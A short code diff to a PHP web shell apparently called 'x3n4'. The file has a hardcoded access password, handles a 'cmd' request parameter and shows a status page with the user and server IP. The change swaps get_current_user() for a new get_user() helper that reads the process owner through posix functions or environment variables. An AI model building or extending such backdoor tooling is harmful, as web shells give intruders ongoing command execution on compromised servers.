@@ -10,7 +10,7 @@ $password = 'P455W0rd';
  */
 function get_shell_prefix()
 {
-    return get_current_user() . '@' . php_uname('n') . ':' . getcwd() . ' $';
+    return get_user() . '@' . php_uname('n') . ':' . getcwd() . ' $';
 }
 function get_shell_command()
 {
@@ -152,6 +152,13 @@ function get_motd()
 
     return 'Welcome to x3n4 '.X3N4_VERSION;
 }
+function get_user(){
+    if (function_exists('posix_getpwuid') && function_exists('posix_getpid')){
+        $info = posix_getpwuid(posix_getuid());
+        return $info['name'];
+    }
+    return getenv('USERNAME') ?: getenv('USER');
+}
 
 /**
  * CORE
@@ -267,7 +274,7 @@ if (isset($_REQUEST['cmd'])) {
                     </tr>
                     <tr>
                         <td>Current user:</td>
-                        <td><?php echo get_current_user(); ?></td>
+                        <td><?php echo get_user(); ?></td>
                     </tr>
                     <tr>
                         <td>Server IP:</td>
